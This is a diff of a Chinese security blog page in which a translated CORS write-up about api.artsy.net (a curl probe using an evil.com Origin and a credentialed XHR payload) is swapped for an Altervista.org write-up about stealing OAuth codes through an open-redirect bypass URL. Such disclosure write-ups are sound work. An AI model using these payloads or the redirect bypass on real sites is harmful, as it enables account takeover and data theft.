@@ -15,21 +15,21 @@
 
 
 
-<meta name="description" content="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net漏洞：跨域请求作者：Muhammad Khizer Javed难度：低">
+<meta name="description" content="原文：How I hacked Altervista.org漏洞：访问重定向窃取token作者：Jacopo Tediosi难度：中">
 <meta property="og:type" content="article">
-<meta property="og:title" content="第十篇翻译：CORS跨域请求">
-<meta property="og:url" content="http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/index.html">
+<meta property="og:title" content="第十七篇：盗取登陆令牌">
+<meta property="og:url" content="http://TimeS0ng.github.io/2019/02/15/第十七篇：盗取登陆令牌/index.html">
 <meta property="og:site_name" content="TimeS0ng&#39;s blog">
-<meta property="og:description" content="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net漏洞：跨域请求作者：Muhammad Khizer Javed难度：低">
+<meta property="og:description" content="原文：How I hacked Altervista.org漏洞：访问重定向窃取token作者：Jacopo Tediosi难度：中">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png">
-<meta property="og:updated_time" content="2019-02-15T05:05:52.641Z">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_17/1.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_17/2.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_17/3.png">
+<meta property="og:updated_time" content="2019-02-15T05:03:52.720Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="第十篇翻译：CORS跨域请求">
-<meta name="twitter:description" content="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net漏洞：跨域请求作者：Muhammad Khizer Javed难度：低">
-<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png">
+<meta name="twitter:title" content="第十七篇：盗取登陆令牌">
+<meta name="twitter:description" content="原文：How I hacked Altervista.org漏洞：访问重定向窃取token作者：Jacopo Tediosi难度：中">
+<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_17/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -61,7 +61,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>第十篇翻译：CORS跨域请求 | TimeS0ng&#39;s blog</title>
+<title>第十七篇：盗取登陆令牌 | TimeS0ng&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -262,20 +262,20 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-第十篇翻译：CORS跨域请求" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-第十七篇：盗取登陆令牌" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/12/23/第十篇翻译：CORS跨域请求/" class="article-date">
-      <time datetime="2018-12-23T10:33:56.000Z" itemprop="datePublished">2018-12-23</time>
+      <a href="/2019/02/15/第十七篇：盗取登陆令牌/" class="article-date">
+      <time datetime="2019-02-15T03:39:27.000Z" itemprop="datePublished">2019-02-15</time>
 </a>
 
  
-    <a href="/2018/12/23/第十篇翻译：CORS跨域请求/#comments" title="查看评论">
+    <a href="/2019/02/15/第十七篇：盗取登陆令牌/#comments" title="查看评论">
         <i class="fa fa-comments-o" aria-hidden="true"></i>
         <span class="count-comment"></span>
         
         
-            <span class="disqus-comment-count" data-disqus-identifier="2018/12/23/第十篇翻译：CORS跨域请求/"></span>
+            <span class="disqus-comment-count" data-disqus-identifier="2019/02/15/第十七篇：盗取登陆令牌/"></span>
         
     </a>
 
@@ -290,7 +290,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      第十篇翻译：CORS跨域请求
+      第十七篇：盗取登陆令牌
     </h1>
   
 
@@ -307,20 +307,17 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h4 id="原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net"><a href="#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net" class="headerlink" title="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net"></a>原文：<a href="https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net/" target="_blank" rel="external">Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net</a></h4><h4 id="漏洞：跨域请求"><a href="#漏洞：跨域请求" class="headerlink" title="漏洞：跨域请求"></a>漏洞：跨域请求</h4><h4 id="作者：Muhammad-Khizer-Javed"><a href="#作者：Muhammad-Khizer-Javed" class="headerlink" title="作者：Muhammad Khizer Javed"></a>作者：<a href="https://blog.securitybreached.org/author/babayaga47/" target="_blank" rel="external">Muhammad Khizer Javed</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
-<h4 id="emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"><a href="#emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测" class="headerlink" title="&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"></a>&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.artsy.net -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png" alt=""></p>
-<h4 id="emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"><a href="#emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞" class="headerlink" title="&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"></a>&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Allow-Origin: https://evil.com</div></pre></td></tr></table></figure>
-<h4 id="emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"><a href="#emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点" class="headerlink" title="&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"></a>&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.artsy.net/api/user_details/user</div></pre></td></tr></table></figure>
-<p>[*]payload代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML =</div><div class="line">alert(this.responseText);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.artsy.net/api/user_details/&lt;User-ID&gt;&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png" alt=""></p>
-<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_10/CORS.mp4" type="video/mp4"><br></video>
+        <h4 id="原文：How-I-hacked-Altervista-org"><a href="#原文：How-I-hacked-Altervista-org" class="headerlink" title="原文：How I hacked Altervista.org"></a>原文：<a href="https://medium.com/@jacopotediosi/how-i-hacked-altervista-org-f23d011cdb96" target="_blank" rel="external">How I hacked Altervista.org</a></h4><h4 id="漏洞：访问重定向窃取token"><a href="#漏洞：访问重定向窃取token" class="headerlink" title="漏洞：访问重定向窃取token"></a>漏洞：访问重定向窃取token</h4><h4 id="作者：Jacopo-Tediosi"><a href="#作者：Jacopo-Tediosi" class="headerlink" title="作者：Jacopo Tediosi"></a>作者：<a href="https://medium.com/@jacopotediosi" target="_blank" rel="external">Jacopo Tediosi</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
+<h2 id="登陆系统的工作原理"><a href="#登陆系统的工作原理" class="headerlink" title="登陆系统的工作原理"></a>登陆系统的工作原理</h2><h4 id="emsp-emsp-在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击-“登录”-按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理"><a href="#emsp-emsp-在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击-“登录”-按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理" class="headerlink" title="&emsp;&emsp;在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击 “登录” 按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理"></a>&emsp;&emsp;在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击 “登录” 按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_17/1.png" alt=""></p>
+<h4 id="emsp-emsp-这只是一个简单的链接"><a href="#emsp-emsp-这只是一个简单的链接" class="headerlink" title="&emsp;&emsp;这只是一个简单的链接"></a>&emsp;&emsp;这只是一个简单的链接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://aa.altervista.org/?client_id=altervista&amp;response_type=code&amp;redirect_uri=http://forum.it.altervista.org/</div></pre></td></tr></table></figure>
+<h4 id="emsp-emsp-如果你已经经过身份认证了，那么该页面只会生成一个”authorization-code”并且将你重定向到-http-forum-it-altervista-org-login-php-do-login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA-3D-3D-amp-authorization-code-XXXXXXXXXXXXXXXXXXX"><a href="#emsp-emsp-如果你已经经过身份认证了，那么该页面只会生成一个”authorization-code”并且将你重定向到-http-forum-it-altervista-org-login-php-do-login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA-3D-3D-amp-authorization-code-XXXXXXXXXXXXXXXXXXX" class="headerlink" title="&emsp;&emsp;如果你已经经过身份认证了，那么该页面只会生成一个”authorization_code”并且将你重定向到 http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&amp;authorization_code=XXXXXXXXXXXXXXXXXXX"></a>&emsp;&emsp;如果你已经经过身份认证了，那么该页面只会生成一个”authorization_code”并且将你重定向到 <a href="http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&amp;authorization_code=XXXXXXXXXXXXXXXXXXX" target="_blank" rel="external">http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&amp;authorization_code=XXXXXXXXXXXXXXXXXXX</a></h4><h4 id="emsp-emsp-这个奇怪的参数-“do”-包含单词-“login”-，然后将”http-forum-it-altervista-org-forum-php“-编码为base64格式后添加在其后。"><a href="#emsp-emsp-这个奇怪的参数-“do”-包含单词-“login”-，然后将”http-forum-it-altervista-org-forum-php“-编码为base64格式后添加在其后。" class="headerlink" title="&emsp;&emsp;这个奇怪的参数 “do” 包含单词 “login” ，然后将”http://forum.it.altervista.org/forum.php“ 编码为base64格式后添加在其后。"></a>&emsp;&emsp;这个奇怪的参数 “do” 包含单词 “login” ，然后将”<a href="http://forum.it.altervista.org/forum.php" target="_blank" rel="external">http://forum.it.altervista.org/forum.php</a>“ 编码为base64格式后添加在其后。</h4><h4 id="emsp-emsp-参数”authorization-code”-包含之前生成的”authorization-code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向"><a href="#emsp-emsp-参数”authorization-code”-包含之前生成的”authorization-code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向" class="headerlink" title="&emsp;&emsp;参数”authorization_code” 包含之前生成的”authorization_code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向"></a>&emsp;&emsp;参数”authorization_code” 包含之前生成的”authorization_code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向</h4><h2 id="How-I-came-to-discover-the-vulnerability"><a href="#How-I-came-to-discover-the-vulnerability" class="headerlink" title="How I came to discover the vulnerability"></a>How I came to discover the vulnerability</h2><h4 id="emsp-emsp-这里存在的漏洞是如果我们能够修改”redirect-uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization-code（于是我们就能登录到他们的账号）"><a href="#emsp-emsp-这里存在的漏洞是如果我们能够修改”redirect-uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization-code（于是我们就能登录到他们的账号）" class="headerlink" title="&emsp;&emsp;这里存在的漏洞是如果我们能够修改”redirect_uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization_code（于是我们就能登录到他们的账号）"></a>&emsp;&emsp;这里存在的漏洞是如果我们能够修改”redirect_uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization_code（于是我们就能登录到他们的账号）</h4><h4 id="emsp-emsp-不幸的是网站似乎对URL提交的参数进行了过滤，它只接受-it-altervista-org-的子域。关于如何绕过，可以参考下面的视频："><a href="#emsp-emsp-不幸的是网站似乎对URL提交的参数进行了过滤，它只接受-it-altervista-org-的子域。关于如何绕过，可以参考下面的视频：" class="headerlink" title="&emsp;&emsp;不幸的是网站似乎对URL提交的参数进行了过滤，它只接受 it.altervista.org.的子域。关于如何绕过，可以参考下面的视频："></a>&emsp;&emsp;不幸的是网站似乎对URL提交的参数进行了过滤，它只接受 it.altervista.org.的子域。关于如何绕过，可以参考下面的<a href="https://youtu.be/0uejy9aCNbI" target="_blank" rel="external">视频</a>：</h4><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_17/shiping.mp4" type="video/mp4"><br></video>
 
 
 
-
-<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+<h4 id="emsp-emsp-视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。"><a href="#emsp-emsp-视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。" class="headerlink" title="&emsp;&emsp;视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。"></a>&emsp;&emsp;视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。</h4><h4 id="emsp-emsp-于是我开始Fuzzing，最后我终于找到绕过过滤器的方法："><a href="#emsp-emsp-于是我开始Fuzzing，最后我终于找到绕过过滤器的方法：" class="headerlink" title="&emsp;&emsp;于是我开始Fuzzing，最后我终于找到绕过过滤器的方法："></a>&emsp;&emsp;于是我开始Fuzzing，最后我终于找到绕过过滤器的方法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://aa.altervista.org/?client_id=altervista&amp;response_type=code&amp;redirect_uri=http://google.it/http://it.altervista.org/</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_17/2.png" alt=""></p>
+<h4 id="emsp-emsp-因此如果我们将我们的服务器地址放到这里而不是google-it，我们就可以窃取访问token了"><a href="#emsp-emsp-因此如果我们将我们的服务器地址放到这里而不是google-it，我们就可以窃取访问token了" class="headerlink" title="&emsp;&emsp;因此如果我们将我们的服务器地址放到这里而不是google.it，我们就可以窃取访问token了"></a>&emsp;&emsp;因此如果我们将我们的服务器地址放到这里而不是google.it，我们就可以窃取访问token了</h4><h4 id="emsp-emsp-拿到token就能直接登录了"><a href="#emsp-emsp-拿到token就能直接登录了" class="headerlink" title="&emsp;&emsp;拿到token就能直接登录了"></a>&emsp;&emsp;拿到token就能直接登录了</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&amp;authorization_code=XXXXXXXXXXXXXXXXXXX</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_17/3.png" alt=""></p>
 
       
     </div>
@@ -329,13 +326,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/12/23/第十篇翻译：CORS跨域请求/">第十篇翻译：CORS跨域请求</a></p>
+        <p><span>本文标题:</span><a href="/2019/02/15/第十七篇：盗取登陆令牌/">第十七篇：盗取登陆令牌</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
-        <p><span>发布时间:</span>2018-12-23, 18:33:56</p>
-        <p><span>最后更新:</span>2019-02-15, 13:05:52</p>
+        <p><span>发布时间:</span>2019-02-15, 11:39:27</p>
+        <p><span>最后更新:</span>2019-02-15, 13:03:52</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/12/23/第十篇翻译：CORS跨域请求/" title="第十篇翻译：CORS跨域请求">http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/02/15/第十七篇：盗取登陆令牌/" title="第十七篇：盗取登陆令牌">http://TimeS0ng.github.io/2019/02/15/第十七篇：盗取登陆令牌/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2019/02/15/第十七篇：盗取登陆令牌/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -347,16 +344,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/12/27/第十一篇翻译：CSRF漏洞/">
-                    第十一篇翻译：CSRF漏洞
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/12/23/第九篇翻译：CORS跨域请求/">
-                    第九篇翻译：CORS跨域请求
+                <a href="/2019/02/15/第十六篇：盲注XSS/">
+                    第十六篇：盲注XSS
                 </a>
             </div>
         
@@ -368,7 +359,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net"><span class="toc-number">1.</span> <span class="toc-text">原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：跨域请求"><span class="toc-number">2.</span> <span class="toc-text">漏洞：跨域请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Muhammad-Khizer-Javed"><span class="toc-number">3.</span> <span class="toc-text">作者：Muhammad Khizer Javed</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：低"><span class="toc-number">4.</span> <span class="toc-text">难度：低</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"><span class="toc-number">5.</span> <span class="toc-text">  大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"><span class="toc-number">6.</span> <span class="toc-text"> 正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"><span class="toc-number">7.</span> <span class="toc-text">  现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#视屏"><span class="toc-number"></span> <span class="toc-text">视屏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打赏译者"><span class="toc-number"></span> <span class="toc-text">打赏译者</span></a>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：How-I-hacked-Altervista-org"><span class="toc-number">1.</span> <span class="toc-text">原文：How I hacked Altervista.org</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞：访问重定向窃取token"><span class="toc-number">2.</span> <span class="toc-text">漏洞：访问重定向窃取token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：Jacopo-Tediosi"><span class="toc-number">3.</span> <span class="toc-text">作者：Jacopo Tediosi</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：中"><span class="toc-number">4.</span> <span class="toc-text">难度：中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登陆系统的工作原理"><span class="toc-number"></span> <span class="toc-text">登陆系统的工作原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击-“登录”-按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理"><span class="toc-number">1.</span> <span class="toc-text">  在Altervista网站上瞎逛一圈之后，我注意到如果您已经登陆到您网站的管理面板，接着要登陆论坛的时候，只需要点击 “登录” 按钮即可，而不需要再次输入登录凭证，所以我开始研究该按钮的工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-这只是一个简单的链接"><span class="toc-number">2.</span> <span class="toc-text">  这只是一个简单的链接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-如果你已经经过身份认证了，那么该页面只会生成一个”authorization-code”并且将你重定向到-http-forum-it-altervista-org-login-php-do-login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA-3D-3D-amp-authorization-code-XXXXXXXXXXXXXXXXXXX"><span class="toc-number">3.</span> <span class="toc-text">  如果你已经经过身份认证了，那么该页面只会生成一个”authorization_code”并且将你重定向到 http://forum.it.altervista.org/login.php?do=login-aHR0cDovL2ZvcnVtLml0LmFsdGVydmlzdGEub3JnL2ZvcnVtLnBocA%3D%3D&authorization_code=XXXXXXXXXXXXXXXXXXX</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-这个奇怪的参数-“do”-包含单词-“login”-，然后将”http-forum-it-altervista-org-forum-php“-编码为base64格式后添加在其后。"><span class="toc-number">4.</span> <span class="toc-text">  这个奇怪的参数 “do” 包含单词 “login” ，然后将”http://forum.it.altervista.org/forum.php“ 编码为base64格式后添加在其后。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-参数”authorization-code”-包含之前生成的”authorization-code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向"><span class="toc-number">5.</span> <span class="toc-text">  参数”authorization_code” 包含之前生成的”authorization_code”。如果你尚未通过身份认证，它会首先询问你用户名、密码，然后以相同的方式将您重定向</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-I-came-to-discover-the-vulnerability"><span class="toc-number"></span> <span class="toc-text">How I came to discover the vulnerability</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-这里存在的漏洞是如果我们能够修改”redirect-uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization-code（于是我们就能登录到他们的账号）"><span class="toc-number">1.</span> <span class="toc-text">  这里存在的漏洞是如果我们能够修改”redirect_uri”参数的值，那么我们就能创建一个特殊的链接，一旦有用户点击就会将他们重定向到我们的服务器上而不是altervista的服务器，这允许我们盗取用户添加在url末尾的authorization_code（于是我们就能登录到他们的账号）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-不幸的是网站似乎对URL提交的参数进行了过滤，它只接受-it-altervista-org-的子域。关于如何绕过，可以参考下面的视频："><span class="toc-number">2.</span> <span class="toc-text">  不幸的是网站似乎对URL提交的参数进行了过滤，它只接受 it.altervista.org.的子域。关于如何绕过，可以参考下面的视频：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。"><span class="toc-number">3.</span> <span class="toc-text">  视屏中指出程序员在解析网址时经常会犯错，特别是当输入不符合规范时。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-于是我开始Fuzzing，最后我终于找到绕过过滤器的方法："><span class="toc-number">4.</span> <span class="toc-text">  于是我开始Fuzzing，最后我终于找到绕过过滤器的方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-因此如果我们将我们的服务器地址放到这里而不是google-it，我们就可以窃取访问token了"><span class="toc-number">5.</span> <span class="toc-text">  因此如果我们将我们的服务器地址放到这里而不是google.it，我们就可以窃取访问token了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-拿到token就能直接登录了"><span class="toc-number">6.</span> <span class="toc-text">  拿到token就能直接登录了</span></a></li></ol>
         
     </div>
     <style>
@@ -404,7 +395,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"第十篇翻译：CORS跨域请求　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"第十七篇：盗取登陆令牌　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -461,15 +452,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/12/27/第十一篇翻译：CSRF漏洞/" title="上一篇: 第十一篇翻译：CSRF漏洞">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
